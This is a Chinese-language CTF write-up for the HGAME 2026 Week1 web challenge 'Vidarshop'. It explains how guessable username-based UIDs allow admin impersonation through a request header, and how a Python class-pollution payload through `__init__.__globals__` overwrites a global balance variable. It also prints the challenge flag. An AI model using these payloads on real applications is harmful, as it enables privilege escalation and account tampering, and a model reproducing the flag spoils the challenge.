# Vidarshop - HGAME 2026 Week1 Web

## 题目信息

- **题目名称**: 什么你这卖的东西这么贵
- **提示**: 
  1. 用户名还要抢
  2. admin可以管我们所有人的钱
  3. update接口直接改的好像是User类的balance属性欸，但是User属性中balance似乎并非...

## 解题过程

### 1. 分析UID生成算法

通过测试发现，UID的生成规则是将用户名每个字母转换为其在字母表中的位置并拼接：

```python
def name_to_uid(name):
    return "".join(str(ord(c.lower()) - ord('a') + 1) for c in name if c.isalpha())

# admin -> a(1) + d(4) + m(13) + i(9) + n(14) = "1413914"
```

### 2. 获取Admin权限

在请求头中使用 `uid: 1413914`（admin的UID），响应中会返回 `is_admin: true`。

### 3. 发现Python原型链污染

通过发送各种payload探测后端结构，发现：
- 后端是Python
- 发送 `{"__init__": {"balance": xxx}}` 返回错误 `'method' object has no attribute 'balance'`
- 发送 `{"_balance": {"test": 1}}` 返回错误 `'int' object has no attribute 'test'`

这说明后端会递归处理嵌套的dict，尝试 `setattr(getattr(obj, key), subkey, value)`。

### 4. 污染全局变量

关键发现：可以通过 `__init__.__globals__` 访问并修改全局变量！

```python
payload = {"__init__": {"__globals__": {"balance": 9999999}}}
```

发送此payload后，全局变量 `balance` 被修改为 9999999。新创建的用户会使用这个被污染的值作为初始余额。

### 5. 获取Flag

1. 使用admin UID发送污染payload
2. 创建新用户（继承被污染的余额）
3. 用新用户购买flag

## Flag

```
hgame{Re@lADM1N_muSt63Rlch111316e8fd}
```

## 漏洞原理

这是一个 **Python原型链污染** 漏洞：

1. 后端代码在处理JSON时会递归设置对象属性
2. Python的方法对象有 `__globals__` 属性，指向函数定义时的全局命名空间
3. 通过 `{"__init__": {"__globals__": {"balance": xxx}}}` 可以修改全局变量
4. 新创建的用户实例会使用被污染的全局变量值

类似于JavaScript中的原型链污染，但利用的是Python的 `__globals__` 特性。
